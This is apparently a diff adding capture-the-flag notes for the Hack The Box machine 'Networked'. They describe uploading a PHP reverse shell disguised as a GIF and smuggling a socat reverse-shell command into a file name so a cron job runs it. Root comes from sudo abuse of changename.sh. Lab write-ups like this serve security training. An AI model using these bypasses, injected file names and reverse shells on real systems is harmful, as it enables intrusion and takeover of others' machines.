@@ -1,0 +1,44 @@
+Netowrk HTB:
+Helpful links:
+ Reverse shells: ( https://blog.barradell-johns.com/index.php/2018/12/30/reverse-shell-cheat-sheet/ )
+ Reverse Shell/Payloads: ( http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet )
+ Exploit name change: (https://seclists.org/fulldisclosure/2019/Apr/24)
+
+Host: 10.10.10.146
+nmap -sC -sV -A 10.10.10.146
+
+Dirb & Dirbuster
+'dirb http://10.10.10.146'
+  Will show a few interesting places
+ 'dirbuster'
+ With the .php extension selected, will most likely show where some possible places for exploit will be.
+
+Need a php reverse shell > look at links for Reverse shells for reference
+After you have the reverse shell add 'GIF89a;' header to the top since the website needs a image file, so you are tricking the website.
+
+http://10.10.10.146/upload.php -to uplaod file
+http://10.10.10.146/photos.php/10_10_14_39.php.jpg -to access it. file gets renamed with ip address based on website settings.
+After successful reverse php shell is made few things you need to look at. Need to look at uplaods in /html and you will see what happens to files in the system. 
+After the system has a file it takes time for the cron to do it. Once the cron runs the file you get the reverse shell. Also note
+there are parsers that are in place so nothing can go into the file... maybe in the name
+
+  Kali:
+  socat file:`tty`,raw,echo=0 TCP-L:4567
+ Network: > /var/www/html/uploads
+ touch ";socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.39:4567"
+
+Socat is used since nothing else seemed to be installed that would allow a reverse-shell from a file name and 
+did not have any '/' in the text
+After socat reverse shell is run you get a shell '@guly'
+
+ Once as Guly: 
+ Run pspy64 and linenum on the system to notice what happens when changename.sh is run as well as other system events
+ https://seclists.org/fulldisclosure/2019/Apr/24 ( very helpful )
+
+ 'sudo -l' to check if sudo is allowed.
+ you can run changename.sh 
+
+ sudo changename.sh > Name= root /bin/sh  >> none for all the rest and then you have root
+
+ now as root> cd /root >> cat root.txt
+ you now have the system!
